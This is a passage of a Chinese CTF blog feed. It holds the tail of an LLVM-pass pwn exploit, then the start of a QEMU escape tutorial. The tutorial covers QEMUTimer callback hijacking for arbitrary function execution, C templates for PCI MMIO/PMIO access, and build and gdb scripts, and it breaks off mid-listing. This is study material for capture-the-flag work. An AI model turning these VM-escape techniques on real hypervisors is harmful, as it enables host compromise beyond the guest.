Qanux138(<span class="number">138</span>);</span><br><span class="line">    Qanux139(<span class="number">139</span>);</span><br><span class="line">    Qanux140(<span class="number">140</span>);</span><br><span class="line">    Qanux141(<span class="number">141</span>);</span><br><span class="line">    Qanux142(<span class="number">142</span>);</span><br><span class="line">    Qanux143(<span class="number">143</span>);</span><br><span class="line">    Qanux144(<span class="number">144</span>);</span><br><span class="line">    Qanux145(<span class="number">145</span>);</span><br><span class="line">    Qanux146(<span class="number">146</span>);</span><br><span class="line">    Qanux147(<span class="number">147</span>);</span><br><span class="line">    Qanux148(<span class="number">148</span>);</span><br><span class="line">    Qanux149(<span class="number">149</span>);</span><br><span class="line">    Qanux150(<span class="number">150</span>);</span><br><span class="line">    Qanux151(<span class="number">151</span>);</span><br><span class="line">    Qanux152(<span class="number">152</span>);</span><br><span class="line">    Qanux153(<span class="number">153</span>);</span><br><span class="line">    Qanux154(<span class="number">154</span>);</span><br><span class="line">    Qanux155(<span class="number">155</span>);</span><br><span class="line">    Qanux156(<span class="number">156</span>);</span><br><span class="line">    Qanux157(<span class="number">157</span>);</span><br><span class="line">    Qanux158(<span class="number">158</span>);</span><br><span class="line">    Qanux159(<span class="number">159</span>);</span><br><span class="line">    Qanux160(<span class="number">160</span>);</span><br><span class="line">    Qanux161(<span class="number">161</span>);</span><br><span class="line">    Qanux162(<span class="number">162</span>);</span><br><span class="line">    Qanux163(<span class="number">163</span>);</span><br><span class="line">    Qanux164(<span class="number">164</span>);</span><br><span class="line">    Qanux165(<span class="number">165</span>);</span><br><span class="line">    Qanux166(<span class="number">166</span>);</span><br><span class="line">    Qanux167(<span class="number">167</span>);</span><br><span class="line">    Qanux168(<span class="number">168</span>);</span><br><span class="line">    Qanux169(<span class="number">169</span>);</span><br><span class="line">    Qanux170(<span class="number">170</span>);</span><br><span class="line">    Qanux171(<span class="number">171</span>);</span><br><span class="line">    Qanux172(<span class="number">172</span>);</span><br><span class="line">    Qanux173(<span class="number">173</span>);</span><br><span class="line">    Qanux174(<span class="number">174</span>);</span><br><span class="line">    Qanux175(<span class="number">175</span>);</span><br><span class="line">    Qanux176(<span class="number">176</span>);</span><br><span class="line">    Qanux177(<span class="number">177</span>);</span><br><span class="line">    Qanux178(<span class="number">178</span>);</span><br><span class="line">    Qanux179(<span class="number">179</span>);</span><br><span class="line">    Qanux180(<span class="number">180</span>);</span><br><span class="line">    Qanux181(<span class="number">181</span>);</span><br><span class="line">    Qanux182(<span class="number">182</span>);</span><br><span class="line">    Qanux183(<span class="number">183</span>);</span><br><span class="line">    Qanux184(<span class="number">184</span>);</span><br><span class="line">    Qanux185(<span class="number">185</span>);</span><br><span class="line">    Qanux186(<span class="number">186</span>);</span><br><span class="line">    Qanux187(<span class="number">187</span>);</span><br><span class="line">    Qanux188(<span class="number">188</span>);</span><br><span class="line">    Qanux189(<span class="number">189</span>);</span><br><span class="line">    Qanux190(<span class="number">190</span>);</span><br><span class="line">    Qanux191(<span class="number">191</span>);</span><br><span class="line">    Qanux192(<span class="number">192</span>);</span><br><span class="line">    Qanux193(<span class="number">193</span>);</span><br><span class="line">    Qanux194(<span class="number">194</span>);</span><br><span class="line">    Qanux195(<span class="number">195</span>);</span><br><span class="line">    Qanux196(<span class="number">196</span>);</span><br><span class="line">    Qanux197(<span class="number">197</span>);</span><br><span class="line">    Qanux198(<span class="number">198</span>);</span><br><span class="line">    Qanux199(<span class="number">199</span>);</span><br><span class="line">    Qanux200(<span class="number">200</span>);</span><br><span class="line">    Qanux201(<span class="number">201</span>);</span><br><span class="line">    Qanux202(<span class="number">202</span>);</span><br><span class="line">    Qanux203(<span class="number">203</span>);</span><br><span class="line">    Qanux204(<span class="number">204</span>);</span><br><span class="line">    Qanux205(<span class="number">205</span>);</span><br><span class="line">    Qanux206(<span class="number">206</span>);</span><br><span class="line">    Qanux207(<span class="number">207</span>);</span><br><span class="line">    Qanux208(<span class="number">208</span>);</span><br><span class="line">    Qanux209(<span class="number">209</span>);</span><br><span class="line">    Qanux210(<span class="number">210</span>);</span><br><span class="line">    Qanux211(<span class="number">211</span>);</span><br><span class="line">    Qanux212(<span class="number">212</span>);</span><br><span class="line">    Qanux213(<span class="number">213</span>);</span><br><span class="line">    Qanux214(<span class="number">214</span>);</span><br><span class="line">    Qanux215(<span class="number">215</span>);</span><br><span class="line">    Qanux216(<span class="number">216</span>);</span><br><span class="line">    Qanux217(<span class="number">217</span>);</span><br><span class="line">    Qanux218(<span class="number">218</span>);</span><br><span class="line">    Qanux219(<span class="number">219</span>);</span><br><span class="line">    Qanux220(<span class="number">220</span>);</span><br><span class="line">    Qanux221(<span class="number">221</span>);</span><br><span class="line">    Qanux222(<span class="number">222</span>);</span><br><span class="line">    Qanux223(<span class="number">223</span>);</span><br><span class="line">    Qanux224(<span class="number">224</span>);</span><br><span class="line">    Qanux225(<span class="number">225</span>);</span><br><span class="line">    Qanux226(<span class="number">226</span>);</span><br><span class="line">    Qanux227(<span class="number">227</span>);</span><br><span class="line">    Qanux228(<span class="number">228</span>);</span><br><span class="line">    Qanux229(<span class="number">229</span>);</span><br><span class="line">    Qanux230(<span class="number">230</span>);</span><br><span class="line">    Qanux231(<span class="number">231</span>);</span><br><span class="line">    Qanux232(<span class="number">232</span>);</span><br><span class="line">    Qanux233(<span class="number">233</span>);</span><br><span class="line">    Qanux234(<span class="number">234</span>);</span><br><span class="line">    Qanux235(<span class="number">235</span>);</span><br><span class="line">    Qanux236(<span class="number">236</span>);</span><br><span class="line">    Qanux237(<span class="number">237</span>);</span><br><span class="line">    Qanux238(<span class="number">238</span>);</span><br><span class="line">    Qanux239(<span class="number">239</span>);</span><br><span class="line">    Qanux240(<span class="number">0</span>);</span><br><span class="line">    Qanux241(<span class="number">0xe0</span>);</span><br><span class="line">    Qanux242(<span class="number">0x77</span>);</span><br><span class="line">    Qanux243(<span class="number">0</span>);</span><br><span class="line">    Qanux244(<span class="number">0</span>);</span><br><span class="line">    Qanux245(<span class="number">0</span>);</span><br><span class="line">    Qanux246(<span class="number">0</span>);</span><br><span class="line">    Qanux247(<span class="number">0</span>);</span><br><span class="line">    Qanux248(<span class="number">248</span>);</span><br><span class="line">    Qanux249(<span class="number">249</span>);</span><br><span class="line">    Qanux250(<span class="number">250</span>);</span><br><span class="line">    Qanux251(<span class="number">251</span>);</span><br><span class="line">    Qanux252(<span class="number">252</span>);</span><br><span class="line">    Qanux253(<span class="number">253</span>);</span><br><span class="line">    Qanux254(<span class="number">254</span>);</span><br><span class="line">    Qanux255(<span class="number">255</span>);</span><br><span class="line">    Qanux240(<span class="number">666</span>);</span><br><span class="line">    Qanux241(<span class="number">666</span>);</span><br><span class="line">    Qanux242(<span class="number">666</span>);</span><br><span class="line">    Qanux243(<span class="number">666</span>);</span><br><span class="line">    Qanux244(<span class="number">666</span>);</span><br><span class="line">    Qanux245(<span class="number">666</span>);</span><br><span class="line">    Qanux246(<span class="number">666</span>);</span><br><span class="line">    Qanux247(<span class="number">666</span>);</span><br><span class="line">    fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/122522485?utm_id=0">https://zhuanlan.zhihu.com/p/122522485?utm_id=0</a><br><a href="https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0</a><br><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6">https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;p&gt;既然说到&lt;code&gt;llvm pass pwn&lt;/code&gt;，我们肯定要先了解&lt;code&gt;llvm&lt;/code&gt;到底是一个什</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初探qemu逃逸</title>
    <link href="https://qanux.github.io/2024/02/19/qemu%E9%80%83%E9%80%B8/"/>
    <id>https://qanux.github.io/2024/02/19/qemu%E9%80%83%E9%80%B8/</id>
    <published>2024-02-18T16:00:00.000Z</published>
    <updated>2024-03-13T15:24:50.381Z</updated>
    
    <content type="html"><![CDATA[<p>最近找时间入门了一下<code>qemu</code>逃逸，发现挺有意思的。感觉其实和用户态的<code>pwn</code>差不多，目标是通过分析<code>qemu-system</code>这个<code>elf</code>中的漏洞使其执行自己想要的函数。在该<code>elf</code>中执行的操作可以访问到<code>qemu</code>外，所以造成了逃逸<br>这里主要用于记录平时<code>qemu</code>逃逸学习时常用的脚本以及入门时做的几道有代表性的题目</p><h1 id="一些可以利用的点"><a href="#一些可以利用的点" class="headerlink" title="一些可以利用的点"></a>一些可以利用的点</h1><p>在<code>qemu</code>的<code>elf</code>中存在一个名为<code>main_loop_tlg</code>的数组，该数组用于存储<code>QEMUTimerList</code>结构体指针</p><h4 id="一些重要结构体"><a href="#一些重要结构体" class="headerlink" title="一些重要结构体"></a>一些重要结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A struct representing a memory region.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;  <span class="comment">// 0x40</span></span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面借用<code>sky123</code>师傅的一张图片</p><img src="/2024/02/19/qemu%E9%80%83%E9%80%B8/1.png" class="" title="我的图图呢">  <p>我们可以将<code>QEMUTimer</code>结构体中的<code>expire_time</code>修改为非负数，<code>cb</code>指针指向我们想要执行的函数的地址，<code>opaque</code>指向存放参数的地址，我们即可实现任意函数执行。从图片中我们还可以发现，<code>active_timers</code>指针是指向<code>QEMUTimer</code>结构体的，我们可以通过修改该指针指向我们伪造的<code>QEMUTimer</code>结构体，也可以实现相同的效果。<br>其实<code>qemu</code>逃逸本质上和<code>user</code>态的<code>pwn</code>没有什么区别，所以在<code>glibc</code>中的各种<code>house of</code>手法在这里也是可以使用的，<code>ACTF 2022</code>就出现了一题<code>qemu</code>逃逸要打<code>fsop</code>，所以我们要放宽我们的思维。</p><h1 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h1><p>还得是<code>eeee</code>和<code>sky123</code>师傅，脚本通俗易懂他们的文章给我学习<code>qemu</code>逃逸提供了很大的帮助</p><h2 id="qemu中访问PCI设备的mmio空间"><a href="#qemu中访问PCI设备的mmio空间" class="headerlink" title="qemu中访问PCI设备的mmio空间"></a>qemu中访问PCI设备的mmio空间</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qemu中访问PCI设备的PMIO空间"><a href="#qemu中访问PCI设备的PMIO空间" class="headerlink" title="qemu中访问PCI设备的PMIO空间"></a>qemu中访问PCI设备的PMIO空间</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"><span class="comment">// cat /sys/devices/pci0000:00/0000:00:04.0/resource</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span>&#123;</span><br><span class="line">    outl(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打包脚本"><a href="#打包脚本" class="headerlink" title="打包脚本"></a>打包脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mkdir ./rootfs</span><br><span class="line">cd ./rootfs</span><br><span class="line">cpio -idmv &lt; ../rootfs.cpio</span><br><span class="line"> </span><br><span class="line">cp ../exp.c ./root</span><br><span class="line">gcc -o ./root/exp -static ./root/exp.c</span><br><span class="line"> </span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"> </span><br><span class="line">cd ..</span><br><span class="line">rm -rf ./rootfs</span><br></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><ul><li>启动<code>qemu</code></li><li>获取进程号</li><li><code>gdb</code>内连接</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 